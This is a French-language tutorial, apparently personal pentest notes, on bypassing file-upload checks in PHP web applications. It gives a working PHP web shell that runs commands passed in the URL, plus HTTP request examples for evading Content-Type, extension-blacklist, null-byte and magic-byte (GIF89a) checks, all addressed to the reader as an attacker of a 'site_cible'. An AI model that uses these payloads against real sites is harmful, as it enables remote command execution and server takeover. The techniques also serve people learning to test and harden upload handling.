# Bypass fichier Upload

^b3aae6

## Introduction 

Il existe une multitude de faille Web ,la faille d'upload des fichiers est l'une des plus violantes selon moi car de nombreuses web applications permettent à des utilisateurs d'ajouter des fichiers à leurs plateformes que ceux soit à travers des photos(avatars,photo de profil),documents et videos et cette faille reside dans le fait qu'il y est negligeance au niveau des controles,
il ne faut jamais faire confiance à l'utilisateur et voici comment vous en tant qu'utilisateur pouvez l'exploiter particulierement dans le cas des applications web tournant sous php


## 1.upload un script

lorsqu'il n'y aucun control comme dans ce cas vous pouvez tout simplement uloade votre script et y acceder à travers l'url 

```
<?php
system($_GET['command']);
?>
```
ensuite acceder au fichier:
url_vers_fichier?command=commande_unix

vous pouvez tous faire que ce soit lister des contenus de repertoires,afficher les contenus des fichiers bref tout ce que vous pouvez faire sur un os basé unix


## 2. Changer le ContentType

Tres souvent il arrive que pour securiser l'application web ,un controle est fait sur le contenu envoyé 
globablement l'application ne vous permettra plus d'upload n'importe quel type de fichier car une verification se fera sur le MIME type de la requete d'upload

```
POST /images/upload2/ HTTP/1.1
Host: site_cible
[...]

--bbAeeeeedddd--
Content-Disposition: form-data; name="upload_fichier"; fichiername="payload.php"
Content-Type: **application/x-php**
```

votre requete sera bloqué car le content-type indique qu'il ne s'agit pas d'une image
il vous suffit de Changer ce champ à l'aide d'un intercepteur tel que Burpsuite

```
POST /images/upload2/ HTTP/1.1
Host: site_cible
[...]

--bbAeeeeedddd--
Content-Disposition: form-data; name="upload_fichier"; fichiername="payload.php"
Content-Type: **image/jpeg**
```

## 3. manipuler l'extension

dans le cas où la verification est faite uniquement sur l'extension du fichier 

### double exetension

```
POST /images/upload/ HTTP/1.1
Host: site_cible
[...]

--bbAeeeeedddd--
Content-Disposition: form-data; name="upload_fichier"; fichiername="payload.php"
Content-Type: application/x-php
```

changer la requete en

```
POST /images/upload/ HTTP/1.1
Host: site_cible
[...]

--bbAeeeeedddd--
Content-Disposition: form-data; name="upload_fichier"; fichiername="payload.php.jpg"
Content-Type: application/x-php
```

lorsque vous avez le moyen d'inclure ce fichier dans un autre à travers une faille LFI(local fichier inclusion) le serveur interpretera le fichier 

### null byte 
    utiliser le principe de la double extension sauf que cette fois vous allez remplacer le ~~.php~~ en .php**A** ou peut importe n'importe quelle lettre fera l'affaire
et avant d'envoyer la requete interceptée modifier dans la partie **HEX** le code hexa de A ou de la lettre choisi par 00 

```
fichier.php%00.gif
```

vous obtiendrez ce fichier et il marquera la fin de l'execution pour l'interpreteur et au considerer le fichier comme une image il le prendra pour un fichier php et executera votre payload

### utiliser une extension peu populaire 
    si le serveur t'empeche d'uploader des fichiers en fonction d'une liste noir d'extension tu devrais utiliser une extension qui ne sera certainement pas dans cette liste noire cad une extension peu connu tel que *phtml,php4,php5,php6* ou modifier la capitalisation

```
fichier.php5 | fichier.pHp5 | fichier.pHtmL
```

## 4. manipuler le contenu du fichier 

lorsque la verification est faite sur le contenu du fichier vous pouvez 

### ajouter GIF89a; au debut fichier
```
POST /images/upload/ HTTP/1.1
Host: site_cible
[...]

--bbAeeeeedddd--
Content-Disposition: form-data; name="upload_fichier"; fichiername="payload.php"
Content-Type: image/gif

GIF89a; <?php payload_here ?>
```
et le  content-type doit rester de ce type image/*image format*

## fusioner le script à une image 

cela permettra de garder le format d'image et ainsi pouvoir uploader une image qui contient en fait un script

